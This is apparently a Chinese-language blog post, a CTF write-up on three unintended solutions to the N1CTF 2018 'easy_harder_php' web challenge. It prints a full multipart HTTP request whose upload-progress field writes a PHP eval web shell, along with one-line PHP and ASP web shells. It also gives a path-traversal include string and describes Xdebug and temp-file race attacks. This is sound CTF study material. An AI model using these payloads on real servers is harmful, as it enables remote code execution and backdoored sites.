---
layout: post
title: "N1CTF easy_harder_php非预期解法"
date: 2018-03-14 23：40
categories: jekyll update
---

# 前言
&emsp;&emsp;上篇文章中复现了官方的预期解法，这里单独将`非预期`解法拿出来复现一遍并记录解题过程。`非预期`解法有三种：
* **1、session.upload开启导致session包含漏洞**
* **2、xdebug**
* **3、/tmp/临时文件竞争**

&emsp;&emsp;本来以为pull下的docker有`easy php`的环境，但经过检查后却发现不满足条件，所以这篇文章主要起到`备忘录`的作用，以供以后遇到满足的条件时方便查阅。

## 1、session.upload开启导致包含漏洞
&emsp;&emsp;`session.upload_progress.enabled`这个参数在php.ini `默认开启`，需要手动置为`Off`，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到
```shell
/var/lib/php5/sess_{your_php_session_id}
```
<div align="center">
    <img src="/images/posts/n1ctf/58.png" width="60%" />  
</div>
&emsp;&emsp;但是从官方拉下来的源码中，发现这个`session.upload_progress.enabled`参数已经被关闭，所以这个解法就没法复现了。
<div align="center">
    <img src="/images/posts/n1ctf/59.png" width="70%" />  
</div>
&emsp;&emsp;所以这里只进行记录这个解法的流程。

&emsp;&emsp;首先构造一个这样的报文(from @berTrAM)，不断的向服务端发送
```
POST / HTTP/1.1
Host: 47.52.246.175:23333
Proxy-Connection: keep-alive
Content-Length: 648
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqV
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17

------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?=`echo '<?php eval($_REQUEST[bertram])?>'>bertram.php`?>
------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file2"; filename="1.php"
Content-Type: text/php

<?php eval($_POST[1]);?>

------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="file1"; filename="2.asp"
Content-Type: application/octet-stream

< %eval request("a")%>

------WebKitFormBoundary2rwkUEtFdqhGMHqV
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundary2rwkUEtFdqhGMHqV--
```
&emsp;&emsp;服务器就会在`/var/lib/php5/sess_5uu8r952rejihbg033m5mckb17`中记录这个上传的文件。接着我们不断刷新生成包含恶意php代码的文件，然后通过LFI包含这个文件
```
action=../../../../../var/lib/php5/sess_5uu8r952rejihbg033m5mckb17
```
&emsp;&emsp;即可getshell

## 2、xdebug
&emsp;&emsp;要使用`Xdebug`get shell，首先服务器要开启如下参数：
<div align="center">
    <img src="/images/posts/n1ctf/60.png" />  
</div>
&emsp;&emsp;但pull下来的docker中，这个参数都不被满足，所以又只能记录利用方式，等以后碰到了方便查阅。
<div align="center">
    <img src="/images/posts/n1ctf/61.png" />  
</div>
&emsp;&emsp;这里参照<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface">rr师傅的博客</a>，首先我们先确定是否可以利用`xdebug`。
<div align="center">
    <img src="/images/posts/n1ctf/62.png" />  
</div>
&emsp;&emsp;当 X-Forwarded-For 的`地址`（这里就是：ricterz.me）的 9000 端口收到连接请求，就可以确定开启了 Xdebug，且开启了 xdebug.remote_connect_back。

&emsp;&emsp;再下面的操作就参照师傅的博客就行了，这里因为没有环境就不再`照抄`了。

## 3、/tmp/临时文件竞争
&emsp;&emsp;要使用`临时文件竞争`，phpinfo的环境要有如下配置：
<div align="center">
    <img src="/images/posts/n1ctf/63.png" />  
</div>
&emsp;&emsp;但公开的docker还是不满足条件。。。

&emsp;&emsp;它大概的原理就是趁系统还没把临时文件删除之前将这个文件包含起来，从而getshell，通常系统的守护进行删除时隔很小，大概在2~3s，所以，我们要使用多线程上传，然后不断刷新包含文件。

## 参考链接
&emsp;&emsp;<a href="https://www.secsearch.top/?kw=n1ctf">黑塔搜索结果</a><br>
&emsp;&emsp;<a href="https://xianzhi.aliyun.com/forum/topic/2148">官方writeup</a><br>
&emsp;&emsp;<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/">国外大佬-条件竞争writeup</a><br>
&emsp;&emsp;<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface">Xdebug利用</a><br>
&emsp;&emsp;<a href="http://bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/">Bendawang</a><br>
